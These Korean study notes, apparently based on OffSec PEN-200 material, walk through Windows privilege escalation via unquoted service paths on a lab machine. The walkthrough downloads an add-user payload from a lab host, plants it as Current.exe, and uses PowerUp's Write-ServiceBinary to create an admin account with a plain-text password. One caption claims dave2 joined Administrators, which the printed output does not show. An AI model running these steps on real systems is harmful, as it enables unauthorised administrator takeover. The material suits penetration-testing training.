# 17.2.3 따옴표 없는 서비스 경로

> **Unquoted Service Paths** · PEN-200 §17.2.3

**서비스 디렉터리나 그 하위에 쓰기 권한은 있는데 안의 파일을 «교체»하지는 못할 때** 쓰는 벡터임. 앞 두 절이 파일 교체·DLL 배치였다면 이쪽은 **경로 해석의 모호함**을 파고듦.

성립 근거는 `CreateProcess` 의 첫 인자 `lpApplicationName` 임. 여기 넘어온 문자열에 **공백이 있는데 따옴표로 감싸지 않으면** 어디까지가 파일명이고 어디부터가 인자인지 함수가 알 수 없음. 그래서 왼쪽부터 공백을 만날 때마다 **앞부분을 파일명으로 보고 `.exe` 를 붙여** 시도하고 나머지를 인자로 넘김. 즉 공백 하나마다 후보 경로가 하나씩 생김.

경로 `C:\Program Files\My Program\My Service\service.exe` 가 따옴표 없이 등록돼 있으면 Windows 는 이 순서로 시도함.

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

악용은 **후보 경로 중 하나에 그 이름의 악성 실행 파일을 놓는 것**임. 서비스가 시작되면 그 파일이 **서비스 계정 권한**으로 실행되고, 그 계정이 대개 `LocalSystem` 이라 그대로 권한 상승이 됨.

관건은 **어느 후보 디렉터리에 쓰기 권한이 있는가**임. 위 예에서 `C:\` 에 `Program.exe`, `C:\Program Files\` 에 `My.exe` 를 놓는 두 선택지는 **일반 사용자에게 기본적으로 쓰기 권한이 없어** 현실성이 낮음. 반면 세 번째인 소프트웨어 자체 설치 디렉터리는 관리자나 개발자가 권한을 느슨하게 열어둔 경우가 있어 실제 표적이 됨.

예제 대상은 RDP 로 접속한 CLIENTWK220 의 `steve`(비밀번호 `securityIsNotAnOption++++++`). 서비스와 바이너리 경로부터 훑음.

```
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select
Name,State,PathName
Name                      State   PathName
----                      -----   --------
...
GammaService                             Stopped C:\Program Files\Enterprise
Apps\Current Version\GammaServ.exe
...
```
*중지 상태의 `GammaService` 가 공백 여럿 든 따옴표 없는 경로를 갖고 있음*

전수 목록에서 눈으로 찾는 것보다 **WMIC 로 걸러내는 편이 빠름**. `wmic service get name,pathname` 출력을 `findstr` 두 단계로 넘김 — `/i /v "C:\Windows\\"` 로 Windows 디렉터리 밖 서비스만 남기고, 다시 `/i /v """` 로 **따옴표가 없는 줄만** 남김. PowerShell 에서는 따옴표 이스케이프가 꼬이므로 `cmd.exe` 에서 실행함(대안은 `Select-String`).

```
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" |
findstr /i /v """
Name                                       PathName
...
GammaService                               C:\Program Files\Enterprise Apps\Current
Version\GammaServ.exe
```

⚠️ 교재 PDF 자체의 조판으로 명령 한 줄이 두 줄로 접혔고 출력의 경로도 중간에서 접힘 — 한 줄로 이어 칠 것.

다음 전제는 **서비스를 우리가 직접 껐다 켤 수 있는가**임. 가능하면 재부팅을 기다릴 필요가 없어 공격이 즉시 성립함.

```
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...
PS C:\Users\steve> Stop-Service GammaService
```

`GammaService` 경로를 위 규칙에 넣으면 후보는 넷임.

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

넷째는 원래 바이너리 자신이라 볼 것이 없고, 앞 셋을 `icacls` 로 확인함.

```
PS C:\Users\steve> icacls "C:\"
C:\ BUILTIN\Administrators:(OI)(CI)(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
Successfully processed 1 files; Failed processing 0 files
PS C:\Users\steve>icacls "C:\Program Files"

                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)

```
*후보 1·2 — `steve` 가 속한 `BUILTIN\Users`·`Authenticated Users` 어느 쪽에도 쓰기 권한이 없어 파일을 놓을 수 없음*

`C:\` 와 `C:\Program Files` 는 예상대로 쓰기가 없음. 세 번째가 답임.

```
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W)
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION
PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED
APPLICATION PACKAGES:(OI)(CI)(RX)
Successfully processed 1 files; Failed processing 0 files
```

`BUILTIN\Users` 에 **`W`(쓰기)** 가 붙어 있음 — 목표는 `C:\Program Files\Enterprise Apps\` 에 **`Current.exe`** 라는 이름으로 악성 파일을 놓는 것으로 확정됨. 「Service Binary Hijacking」 절에서 컴파일한 `adduser.exe` 를 재사용하되 **받을 때 이름을 후보 경로에 맞춰 바꾸는 것**이 핵심임.

```
PS C:\Users\steve> iwr -uri http://192.168.48.3/adduser.exe -Outfile Current.exe
PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

`Start-Service GammaService` 를 치면 **서비스 시작은 오류로 실패함.** 크로스 컴파일한 C 코드가 원래 경로에서 남은 인자를 받지 못하기 때문임.

```
PS C:\Users\steve> Start-Service GammaService
Start-Service : Service 'GammaService (GammaService)' cannot be started due to the
following error: Cannot start
service GammaService on computer '.'.
At line:1 char:1
+ Start-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError:
(System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
   ServiceCommandException
    + FullyQualifiedErrorId :
CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
PS C:\Users\steve> net user
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.
PS C:\Users\steve> net localgroup administrators

Members

daveadmin

```
*시작은 `CouldNotStartService` 로 끝나지만 `dave2` 가 생성돼 Administrators 에 들어가 있음*

**오류가 곧 실패가 아님** — `Current.exe` 는 이미 실행됐음. 시험장에서 오류 메시지만 보고 물러서지 말 것.

원상 복구는 서비스를 중지하고 `Current.exe` 를 지우는 것 — 파일이 사라지면 다음 시작부터 다시 `GammaServ.exe` 가 쓰임.

**PowerUp 으로 자동화**도 됨. `Get-UnquotedService` 가 취약 서비스를 찾아주고, 함께 나오는 `StartName`(여기서는 `LocalSystem`)과 `CanRestart` 가 **권한 상승 가치와 실행 가능성**을 그대로 답해줌.

```
PS C:\Users\steve> iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\steve> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Users\steve> . .\PowerUp.ps1
PS C:\Users\steve> Get-UnquotedService
ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated
Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService
ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated
Users;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService
...
```

출력이 알려주는 `AbuseFunction` 이 `Write-ServiceBinary` 임. `-Path` 에 앞서 정한 후보 경로를 그대로 넣음. 기본 동작은 **`john` / `Password123!` 로컬 계정을 만들어 Administrators 에 추가**하는 것.

```
PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program
Files\Enterprise Apps\Current.exe"
ServiceName  Path                                         Command
-----------  ----                                         -------
GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123!
/add && timeout /t 5 && net loc...
PS C:\Users\steve> Restart-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...
Restart-Service : Failed to start service 'GammaService (GammaService)'.
At line:1 char:1
+ Restart-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError:
(System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
   , ServiceCommandException
    + FullyQualifiedErrorId :
StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand
```
*`Command` 열이 심어질 명령임 — `net user john Password123! /add` 뒤에 관리자 그룹 추가가 이어짐*

⚠️ 이 명령도 교재 PDF 자체의 조판으로 두 줄로 접힘 — 한 줄로 이어 칠 것.

이어서 `Restart-Service GammaService` 도 앞서와 마찬가지로 서비스 시작 오류를 내지만 `john` 은 관리자로 생성됨.

```
PS C:\Users\steve> net user
User accounts for \\CLIENTWK220
-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    john            offsec
steve                    WDAGUtilityAccount
The command completed successfully.
PS C:\Users\steve> net localgroup administrators
...
john
...
```
*`john` 이 계정 목록과 Administrators 양쪽에 있음*

조건 조합이 까다로운 취약점이지만 **조건만 맞으면 악용이 단순**해 열거 목록에서 빼지 말 것.
